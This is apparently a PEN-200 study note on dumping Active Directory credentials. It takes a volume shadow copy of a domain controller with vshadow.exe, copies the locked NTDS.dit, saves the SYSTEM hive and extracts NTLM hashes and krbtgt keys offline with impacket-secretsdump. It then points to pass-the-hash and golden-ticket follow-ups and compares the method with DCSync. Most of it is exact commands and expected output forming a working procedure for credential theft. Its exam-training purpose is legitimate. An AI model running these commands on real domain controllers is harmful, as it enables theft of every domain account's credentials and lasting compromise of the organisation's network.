# NTDS.dit via VSS Shadow Copy

**If you already have Domain Admin / administrative access to a Domain Controller, Volume Shadow Copy Service (VSS) gives you a way to copy the normally locked `NTDS.dit` database and extract domain credentials offline.** PEN-200 presents this under AD persistence/credential-retention techniques.

```text
DA / admin access to DC
        ↓
Create VSS snapshot of C:
        ↓
Copy Windows\NTDS\ntds.dit from shadow volume
        ↓
Save HKLM\SYSTEM
        ↓
Transfer both files to Kali
        ↓
impacket-secretsdump -ntds ... -system ... LOCAL
        ↓
NTLM hashes + Kerberos keys for domain accounts
```

---

## 1. Create a shadow copy

`vshadow.exe` is a Microsoft-signed utility from the Windows SDK.

From an elevated prompt on the DC:

```cmd
vshadow.exe -nw -p C:
```

`-nw` disables VSS writers and `-p` creates a persistent snapshot on disk.

Record the returned **Shadow copy device name**, for example:

```text
\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```

---

## 2. Copy `NTDS.dit` from the snapshot

```cmd
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\ntds.dit C:\ntds.dit.bak
```

The live database is normally locked; the snapshot gives you a readable point-in-time copy.

---

## 3. Save the SYSTEM registry hive

The SYSTEM hive is needed to derive the boot key required to decrypt secrets in `NTDS.dit`.

```cmd
reg.exe save HKLM\SYSTEM C:\system.bak
```

Transfer both files to Kali:

```text
C:\ntds.dit.bak
C:\system.bak
```

See [[Basics/File Transfer/Windows → Linux (Exfil)|Windows → Linux Exfil]].

---

## 4. Dump credentials offline

```bash
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

Expected useful output includes:

```text
DOMAIN users → NTLM hashes
krbtgt       → NTLM hash / Kerberos key material
computer accounts
Kerberos AES/other keys
```

The hashes can be cracked or reused through [[Lateral Movement — Pass-the-Hash]]. The `krbtgt` material can enable [[Golden Ticket]] persistence.

---

## VSS vs DCSync

```text
Need domain credential material?
│
├─ Have replication rights
│    └─ [[DCSync Attack|DCSync]]
│         → remotely request hashes through AD replication
│
└─ Have administrative/DC filesystem access
     └─ VSS Shadow Copy
          → copy NTDS.dit + SYSTEM and dump offline
```

**DCSync does not need to read `NTDS.dit` from disk.** VSS does. On an exam, prefer the shortest reliable path your current privileges support.

> [!important]
> This is a post-domain-compromise technique. If you already have DA-equivalent control, first capture the required proof/evidence and only perform broad credential dumping when it is necessary for the objective.
